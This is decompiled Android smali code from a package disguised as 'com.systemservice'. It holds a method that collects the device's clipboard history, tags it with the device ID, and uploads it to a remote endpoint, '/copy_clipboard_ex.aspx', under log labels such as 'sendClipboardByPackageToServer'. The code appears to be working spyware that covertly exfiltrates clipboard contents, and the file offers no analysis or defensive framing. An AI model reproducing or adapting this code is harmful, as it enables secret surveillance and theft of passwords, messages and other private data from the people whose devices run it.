.class public Lcom/systemservice/a/c/d/c;
.super Lcom/systemservice/common/features/settingHistory/b;
.source ""


# static fields
.field private static c:Lorg/apache/log4j/Logger;


# direct methods
.method public static a(Landroid/content/Context;Ljava/util/List;)I
    .locals 8
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ljava/util/List<",
            "Lcom/systemservice/a/e/h;",
            ">;)I"
        }
    .end annotation

    const-string v0, "ZClipboard"

    const-string v1, "ServerProtocolForClipBoard"

    invoke-static {v1}, Lcom/systemservice/a/e/m;->a(Ljava/lang/String;)Lorg/apache/log4j/Logger;

    move-result-object v1

    sput-object v1, Lcom/systemservice/a/c/d/c;->c:Lorg/apache/log4j/Logger;

    const/4 v1, 0x1

    if-nez p1, :cond_0

    return v1

    :cond_0
    const/16 v2, 0x64

    :try_start_0
    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result v3

    if-nez v3, :cond_1

    return v1

    :cond_1
    invoke-static {p1, p0}, Lcom/systemservice/a/a/m;->d(Ljava/util/List;Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    if-nez p1, :cond_2

    return v2

    :cond_2
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, " pcontent == "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v3, Ljava/util/ArrayList;

    invoke-direct {v3}, Ljava/util/ArrayList;-><init>()V

    const-string v4, "deviceid"

    invoke-virtual {v3, v4}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    const-string v4, "pcontent"

    invoke-virtual {v3, v4}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    new-instance v4, Ljava/util/ArrayList;

    invoke-direct {v4}, Ljava/util/ArrayList;-><init>()V

    invoke-static {p0}, Lcom/systemservice/a/a/l;->d(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    invoke-virtual {v4, p1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    sget-object v5, Lcom/systemservice/a/c/d/c;->c:Lorg/apache/log4j/Logger;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "sendClipboardByPackageToServer = "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v5, p1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {p0}, Lcom/systemservice/a/a/l;->f(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {p1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "/copy_clipboard_ex.aspx"

    invoke-virtual {p1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1, v3, v4}, Lcom/systemservice/common/features/settingHistory/a;->a(Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;)Ljava/lang/String;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {p0}, Lcom/systemservice/a/a/l;->d(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, "= DeviceID and strContent ="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v0, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {v5}, Lcom/systemservice/a/a/l;->d(Ljava/lang/String;)I

    move-result v2

    new-instance v0, Lcom/systemservice/a/e/n;

    invoke-direct {v0}, Lcom/systemservice/a/e/n;-><init>()V

    invoke-virtual {v0, p1}, Lcom/systemservice/a/e/n;->g(Ljava/lang/String;)V

    const-string p1, "ClipBoard List"

    invoke-virtual {v0, p1}, Lcom/systemservice/a/e/n;->f(Ljava/lang/String;)V

    invoke-static {p0}, Lcom/systemservice/a/a/l;->d(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Lcom/systemservice/a/e/n;->c(Ljava/lang/String;)V

    invoke-static {v3, v4}, Lcom/systemservice/common/features/settingHistory/a;->a(Ljava/util/ArrayList;Ljava/util/ArrayList;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Lcom/systemservice/a/e/n;->a(Ljava/lang/String;)V

    invoke-virtual {v0, v2}, Lcom/systemservice/a/e/n;->a(I)V

    invoke-static {}, Lcom/systemservice/a/a/l;->d()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Lcom/systemservice/a/e/n;->b(Ljava/lang/String;)V

    const-string p1, "ClipBoard History List"

    invoke-virtual {v0, p1}, Lcom/systemservice/a/e/n;->e(Ljava/lang/String;)V

    invoke-static {}, Lcom/systemservice/a/a/l;->d()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Lcom/systemservice/a/e/n;->d(Ljava/lang/String;)V

    invoke-static {v0, p0, v1}, Lcom/systemservice/a/a/l;->a(Lcom/systemservice/a/e/n;Landroid/content/Context;Z)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return v2

    :catch_0
    move-exception p0

    sget-object p1, Lcom/systemservice/a/c/d/c;->c:Lorg/apache/log4j/Logger;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "sendClipboardByPackageToServer "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    invoke-virtual {p0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    return v2
.end method
